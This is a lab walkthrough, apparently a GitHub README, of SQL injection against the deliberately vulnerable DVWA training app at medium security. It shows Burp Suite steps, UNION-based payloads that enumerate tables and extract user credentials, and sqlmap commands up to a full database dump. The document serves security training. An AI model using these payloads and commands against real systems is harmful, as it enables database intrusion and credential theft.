<img width="869" height="629" alt="image" src="https://github.com/user-attachments/assets/266f4f19-bf84-4222-81a5-7487de2090b0" /># DVWA Medium Level



## DVWA Testing Medium Level


- In this i used `DVWA` in my `loacal Machine` in my `Docker` and use `Burp Suite` in my kali: http://192.168.100.97:8080/
- In my target i set it to `Medium Level`:
<img width="1012" height="927" alt="image" src="https://github.com/user-attachments/assets/893dc62f-a906-4cef-9539-9a85e2b0bb7b" />

- And now in my `SQL Injection`  i can choose `number` in list like:
<img width="1013" height="908" alt="image" src="https://github.com/user-attachments/assets/2c3ee0cb-7c93-4b7d-88da-62f2dfdd514f" />

<img width="1012" height="703" alt="image" src="https://github.com/user-attachments/assets/192e172d-d658-4234-b0e5-a04fa125bf67" />


## Use with Burp Suite
- First i need to open my `Burp Suite`:
<img width="1919" height="1065" alt="image" src="https://github.com/user-attachments/assets/43a01bb8-b383-4912-83d3-37579cba223e" />

- So in this after i login with my `Credentials` go back to our `SQL Injection` and then it this i can choose `number`, also if i choose `1`:
<img width="866" height="852" alt="image" src="https://github.com/user-attachments/assets/21dba26d-bb14-4106-a5c3-05de3f2e358d" />

<img width="803" height="537" alt="image" src="https://github.com/user-attachments/assets/b1933bd5-e6d9-4720-a112-78eeba377b4a" />

- And after go to back our `Burp Suite` we will see this:
<img width="1919" height="848" alt="image" src="https://github.com/user-attachments/assets/d8953726-f308-4a41-be65-67d050243400" />

- After this `Right` click on it and select `Send to Repeater`:
<img width="1918" height="900" alt="image" src="https://github.com/user-attachments/assets/d185474b-2538-4a38-b7c9-801ccb0d0960" />

- And then go to `Repeater` also in these we can chenge to something:
<img width="1199" height="562" alt="image" src="https://github.com/user-attachments/assets/01306777-4a7f-49c0-b42f-11fe40d7b94e" />

- Like i want to change payload in this:
<img width="1580" height="788" alt="image" src="https://github.com/user-attachments/assets/7eab3b3c-971d-43bf-a769-8f013bddce9a" />

<img width="1540" height="742" alt="image" src="https://github.com/user-attachments/assets/55ec73d2-81e5-466b-ad90-24ac696fccb2" />

- we see this is the same between in `browser` and in `Burp Suite`.

- And what about if i input `Wrong payload` like if i input `' ` what happen?
<img width="1576" height="521" alt="image" src="https://github.com/user-attachments/assets/47eae981-8e8f-46a3-bf2c-a226ba128ef0" />

- In this we see what Different between `Correct Payload` and `Wrong Payload`.


## Use These Payloads and encode
### Numeric-Based Payloads (No Quotes Needed)
````
1 OR 1=1 # 
1 UNION SELECT 1,@@version
1 UNION SELECT user(),database()
1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
````
<img width="1918" height="602" alt="image" src="https://github.com/user-attachments/assets/94fa5681-69cd-41f5-8f03-8d9d109e41a6" />

<img width="786" height="372" alt="image" src="https://github.com/user-attachments/assets/c47c8976-c0e5-4d67-bd47-6800cd53b9ec" />

- After select on `1 OR 1=1 # ` Press `Ctrl + U`, after it `encode` click on `Send`:
<img width="1915" height="592" alt="image" src="https://github.com/user-attachments/assets/916efd50-0566-4047-a7cc-09efa72cbbd9" />

- It show this so this mean we input the `Correct Payload`:
<img width="1915" height="818" alt="image" src="https://github.com/user-attachments/assets/57e55a49-b2c8-4ae5-9c18-585c06e42448" />

<img width="1918" height="815" alt="image" src="https://github.com/user-attachments/assets/42868dad-8502-4803-b557-c54cf8a1eab1" />

- So this our `Result`.
---

- Payload: `1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()`
<img width="1917" height="781" alt="image" src="https://github.com/user-attachments/assets/04e0a65d-e3eb-4ecc-bea4-a67e8a13b3d1" />

- After select on it Press `Ctrl + U` and click on `Send`:
<img width="1917" height="793" alt="image" src="https://github.com/user-attachments/assets/7a52a118-6f65-47f1-aff3-572a6b2c48b2" />

<img width="1578" height="785" alt="image" src="https://github.com/user-attachments/assets/c02a2bfd-1845-4db2-8a33-be4132b60bd2" />



## Exploitation Chain

### Determine Column Count
````
1 ORDER BY 1
1 ORDER BY 2
1 ORDER BY 3
````
- Payload: 1 ORDER BY 1
<img width="1907" height="765" alt="image" src="https://github.com/user-attachments/assets/83476146-361e-4304-a464-9c011f28733c" />



### Test Union Injection
````
1 UNION SELECT 1,2
````
<img width="1916" height="812" alt="image" src="https://github.com/user-attachments/assets/658466ed-fe9e-43d5-af98-fb14fe0a6239" />



### Extract Database Information
````
1 UNION SELECT @@version, @@hostname
1 UNION SELECT user(), database()
1 UNION SELECT @@datadir, @@basedir
````
- Payload: `1 UNION SELECT @@version, @@hostname`
<img width="1912" height="766" alt="image" src="https://github.com/user-attachments/assets/bafd740b-af1c-4f7a-bc1d-b8976d87ff50" />



### Extract Table Names
````
1 UNION SELECT 1,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
````
<img width="1918" height="760" alt="image" src="https://github.com/user-attachments/assets/adf51e27-c9fc-4fa4-9a0b-c1e975a77983" />


###  Extract User Credentials
````
1 UNION SELECT user, password FROM users
1 UNION SELECT GROUP_CONCAT(user), GROUP_CONCAT(password) FROM users
1 UNION SELECT CONCAT(user,':',password), '2' FROM users
````
<img width="1912" height="732" alt="image" src="https://github.com/user-attachments/assets/40c38333-6748-4440-9a8c-8787a4bded51" />


---


# SQLMap Techniques for Medium Security

## Check target `Cookie`:
- Use `Burp Suite` to check:
<img width="1925" height="836" alt="image" src="https://github.com/user-attachments/assets/9f23d186-0289-4173-ae93-fa98191f662a" />

<img width="787" height="423" alt="image" src="https://github.com/user-attachments/assets/484b3bb6-bc35-437d-a794-175653b71d2f" />

- Or direct in website:
<img width="995" height="780" alt="image" src="https://github.com/user-attachments/assets/e4eead7e-251f-4803-b44c-4ec4aab5d9ab" />

<img width="1915" height="851" alt="image" src="https://github.com/user-attachments/assets/242ad87b-2596-47bb-84bf-8a766ee001c7" />

<img width="1887" height="665" alt="image" src="https://github.com/user-attachments/assets/9d38f61d-6968-48f7-9313-3f50db55bd08" />

- In this we see between `Burp Suite` and check direct in `Website` has the same `cookie`:
<img width="1771" height="862" alt="image" src="https://github.com/user-attachments/assets/73ae4664-636e-4e51-b00a-2b55394bc2c3" />

---


## Direct SQLMap with Data Parameter

### Basic detection
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=8vnqmnoceg5l160mu7kj9n1ua3; security=medium" --batch
````
<img width="1915" height="807" alt="image" src="https://github.com/user-attachments/assets/97025819-7cab-403c-af27-26d60a225b9a" />

<img width="1918" height="528" alt="image" src="https://github.com/user-attachments/assets/8c11edad-0205-4a97-8b1a-b9bcd276e1d4" />


### Full database enumeration
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=8vnqmnoceg5l160mu7kj9n1ua3; security=medium" --dbms=mysql --level=3 --risk=2 --batch
````
<img width="1919" height="809" alt="image" src="https://github.com/user-attachments/assets/ef6093ad-0af9-4d6e-a700-02b5ba0a4bc1" />

<img width="1612" height="794" alt="image" src="https://github.com/user-attachments/assets/e5eab7e1-706b-43c5-aebb-d42c84e9fcf3" />

<img width="1246" height="809" alt="image" src="https://github.com/user-attachments/assets/4769f7a6-b7f0-4f1d-9a59-cf4d53866ee2" />

<img width="868" height="790" alt="image" src="https://github.com/user-attachments/assets/68c327ef-84c4-4278-9d2d-00be334b07b6" />

- In this we see very details, But hard to view.
## Using Request Files

### Create request file
````
sudo mousepad dvwa_medium.req
````
````
POST /dvwa/vulnerabilities/sqli/ HTTP/1.1
Host: 192.168.127.129
Cookie: PHPSESSID=8vnqmnoceg5l160mu7kj9n1ua3; security=medium
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

id=1&Submit=Submit
````
<img width="332" height="66" alt="image" src="https://github.com/user-attachments/assets/8d5d745a-819b-44ba-b55f-6b547ae160a5" />


### Use with SQLMap
````
sqlmap -r dvwa_medium.req --batch
````
<img width="1713" height="622" alt="image" src="https://github.com/user-attachments/assets/67316ba2-4280-4a96-9454-cf94592f7e25" />

<img width="1901" height="422" alt="image" src="https://github.com/user-attachments/assets/f9f51272-7c95-4553-9b10-1df767c51be8" />


## Database dump
````
sqlmap -u "http://192.168.127.129/dvwa/vulnerabilities/sqli/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=8vnqmnoceg5l160mu7kj9n1ua3; security=medium" --dbs --tables --columns --dump --batch
````






























